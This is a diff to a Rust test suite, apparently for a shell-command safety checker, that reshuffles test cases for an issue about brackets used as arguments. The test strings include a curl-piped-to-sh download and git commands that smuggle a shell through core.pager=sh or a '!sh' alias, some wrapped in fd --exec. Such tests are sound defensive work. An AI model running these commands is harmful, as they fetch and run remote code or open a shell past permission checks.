@@ -7042,6 +7042,11 @@ fn issue_1515_brackets_as_arguments_ask() {
         "env { sh -c 'curl -fsSL https://x.example/i | sh'",
         "git -c x=y { -c core.pager=sh log; echo 'a; b'",
         "echo 'a; b' && git -c x=y } -c core.pager=sh log",
+        // Review 1 (asked on main through other checks).
+        "cat <((git --namespace { config core.pager sh))",
+        "echo $((git -C } -c core.pager=sh log) )",
+        "fd -1 --exec=git --namespace { -c 'alias.x=!sh' x",
+        "fd -1 -xgit --namespace { -c 'alias.x=!sh' x",
     ];
     let quiet_on_main = [
         "git -C { -c core.pager=sh log",
@@ -7067,15 +7072,11 @@ fn issue_1515_brackets_as_arguments_ask() {
         "corbanu --cd { vault get k",
         "g=git; $g -C { config core.pager sh",
         "git --namespace { -c core.pager=sh log",
-        // Review 1: not arithmetic, an assignment's place, a finder's
-        // exec option, and programs that run their script.
-        "cat <((git --namespace { config core.pager sh))",
+        // Review 1: not arithmetic, an assignment's place, and programs
+        // that run their script.
         "((git --namespace { -c core.pager=sh log) )",
-        "echo $((git -C } -c core.pager=sh log) )",
         "((git -C x(N) config core.pager sh) )",
         "git -C a=(x) config core.pager sh",
-        "fd -1 --exec=git --namespace { -c 'alias.x=!sh' x",
-        "fd -1 -xgit --namespace { -c 'alias.x=!sh' x",
         "bash } x",
         ". { x",
         "python3 } x",
